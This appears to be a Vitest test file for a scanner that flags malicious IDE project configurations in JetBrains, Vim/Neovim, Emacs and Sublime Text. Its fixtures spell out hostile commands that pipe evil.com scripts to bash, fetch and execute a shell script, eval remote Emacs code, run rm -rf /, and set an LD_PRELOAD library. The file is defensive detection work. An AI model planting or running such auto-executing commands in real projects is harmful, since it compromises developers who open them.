import { describe, it, expect } from 'vitest';
import {
  detectJetBrainsRisks,
  detectVimRisks,
  detectEmacsRisks,
  detectSublimeRisks,
  detectIDEMalware,
} from '../ideRules';

describe('IDE Security Rules', () => {
  describe('JetBrains Detection', () => {
    it('should detect malicious shell scripts in run configurations', () => {
      const content = `
        <component name="ProjectRunConfigurationManager">
          <configuration name="Shell Script" type="ShConfigurationType">
            <option name="SCRIPT_TEXT" value="curl https://evil.com/payload.sh | bash" />
          </configuration>
        </component>
      `;
      const findings = detectJetBrainsRisks('.idea/runConfigurations/test.xml', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('jetbrains-run-config-shell');
      expect(findings[0].severity).toBe('high');
    });

    it('should detect scripts from temp directory', () => {
      const content = `
        <configuration name="Python" type="PythonConfigurationType">
          <option name="SCRIPT_NAME" value="/tmp/malicious.py" />
        </configuration>
      `;
      const findings = detectJetBrainsRisks('.idea/runConfigurations/python.xml', content);
      expect(findings.some(f => f.id === 'jetbrains-run-config-temp-script')).toBe(true);
    });

    it('should detect dangerous external tool commands', () => {
      const content = `
        <toolSet name="External Tools">
          <tool name="Download" description="Downloads payload">
            <option name="COMMAND" value="wget https://evil.com/shell.sh &amp;&amp; chmod +x shell.sh" />
          </tool>
        </toolSet>
      `;
      const findings = detectJetBrainsRisks('.idea/workspace.xml', content);
      expect(findings.some(f => f.id === 'jetbrains-external-tool-cmd')).toBe(true);
    });

    it('should not flag safe configurations', () => {
      const content = `
        <configuration name="Build" type="GradleRunConfiguration">
          <option name="TASK_NAME" value="build" />
        </configuration>
      `;
      const findings = detectJetBrainsRisks('.idea/runConfigurations/build.xml', content);
      expect(findings.length).toBe(0);
    });
  });

  describe('Vim/Neovim Detection', () => {
    it('should detect dangerous vim modelines', () => {
      const content = `
        # This is a file
        # vim: set !curl https://evil.com | bash :
      `;
      const findings = detectVimRisks('config.py', content);
      expect(findings.some(f => f.id === 'vim-modeline-exec')).toBe(true);
    });

    it('should detect system() in modelines', () => {
      const content = `
        /* vim: set tw=80 : system('whoami') */
      `;
      const findings = detectVimRisks('file.c', content);
      expect(findings.some(f => f.id === 'vim-modeline-exec')).toBe(true);
    });

    it('should detect dangerous local .exrc', () => {
      const content = `
        autocmd BufRead * !curl https://evil.com/steal.sh | bash
      `;
      const findings = detectVimRisks('.exrc', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].severity).toBe('critical');
    });

    it('should detect dangerous .nvimrc with autocmd', () => {
      const content = `
        autocmd VimEnter * call system('wget https://evil.com/payload')
      `;
      const findings = detectVimRisks('.nvimrc', content);
      expect(findings.some(f => f.id === 'vim-local-config-exec')).toBe(true);
    });

    it('should not flag safe vim configs', () => {
      const content = `
        set number
        set tabstop=2
        syntax on
      `;
      const findings = detectVimRisks('.vimrc', content);
      expect(findings.length).toBe(0);
    });
  });

  describe('Emacs Detection', () => {
    it('should detect shell-command in .dir-locals.el', () => {
      const content = `
        ((nil . ((eval . (shell-command "curl https://evil.com | bash")))))
      `;
      const findings = detectEmacsRisks('.dir-locals.el', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('emacs-dir-locals-exec');
      expect(findings[0].severity).toBe('critical');
    });

    it('should detect call-process in dir-locals', () => {
      const content = `
        ((python-mode . ((eval . (call-process "python" nil nil nil "-c" "import os; os.system('rm -rf /')")))))
      `;
      const findings = detectEmacsRisks('.dir-locals.el', content);
      expect(findings.some(f => f.id === 'emacs-dir-locals-exec')).toBe(true);
    });

    it('should detect url-retrieve', () => {
      const content = `
        ((nil . ((eval . (url-retrieve "https://evil.com/payload.el" (lambda (status) (eval (buffer-string))))))))
      `;
      const findings = detectEmacsRisks('.dir-locals.el', content);
      expect(findings.some(f => f.id === 'emacs-dir-locals-exec')).toBe(true);
    });

    it('should detect unsafe local variables setting', () => {
      const content = `
        ((nil . ((enable-local-variables . :all))))
      `;
      const findings = detectEmacsRisks('.dir-locals.el', content);
      expect(findings.some(f => f.id === 'emacs-unsafe-local-vars')).toBe(true);
    });

    it('should not flag safe dir-locals', () => {
      const content = `
        ((python-mode . ((indent-tabs-mode . nil)
                         (fill-column . 79))))
      `;
      const findings = detectEmacsRisks('.dir-locals.el', content);
      expect(findings.length).toBe(0);
    });
  });

  describe('Sublime Text Detection', () => {
    it('should detect dangerous shell_cmd in project file', () => {
      const content = JSON.stringify({
        build_systems: [
          {
            name: 'Malicious Build',
            shell_cmd: 'curl https://evil.com/payload.sh | bash'
          }
        ]
      });
      const findings = detectSublimeRisks('project.sublime-project', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('sublime-build-shell-cmd');
    });

    it('should detect dangerous cmd array', () => {
      const content = JSON.stringify({
        build_systems: [
          {
            name: 'Build',
            cmd: ['bash', '-c', 'wget https://evil.com/shell.sh && chmod +x shell.sh && ./shell.sh']
          }
        ]
      });
      const findings = detectSublimeRisks('project.sublime-project', content);
      expect(findings.some(f => f.id === 'sublime-build-cmd')).toBe(true);
    });

    it('should detect suspicious env vars', () => {
      const content = JSON.stringify({
        build_systems: [
          {
            name: 'Build',
            shell_cmd: 'make',
            env: {
              'LD_PRELOAD': '/tmp/evil.so',
              'PAYLOAD': 'curl https://evil.com | bash'
            }
          }
        ]
      });
      const findings = detectSublimeRisks('project.sublime-project', content);
      expect(findings.some(f => f.id === 'sublime-build-env')).toBe(true);
    });

    it('should detect .sublime-build files', () => {
      const content = JSON.stringify({
        shell_cmd: 'powershell -Command "Invoke-WebRequest https://evil.com"'
      });
      const findings = detectSublimeRisks('malicious.sublime-build', content);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should not flag safe sublime projects', () => {
      const content = JSON.stringify({
        build_systems: [
          {
            name: 'Build',
            shell_cmd: 'npm run build'
          }
        ],
        folders: [
          { path: '.' }
        ]
      });
      const findings = detectSublimeRisks('project.sublime-project', content);
      expect(findings.length).toBe(0);
    });
  });

  describe('Combined IDE Detection', () => {
    it('should run all IDE detections', () => {
      const jetbrainsContent = `<option name="SCRIPT_TEXT" value="curl evil.com | bash" />`;
      const findings = detectIDEMalware('.idea/runConfigurations/test.xml', jetbrainsContent);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should return empty for non-IDE files', () => {
      const content = 'console.log("hello")';
      const findings = detectIDEMalware('src/index.js', content);
      expect(findings.length).toBe(0);
    });
  });
});
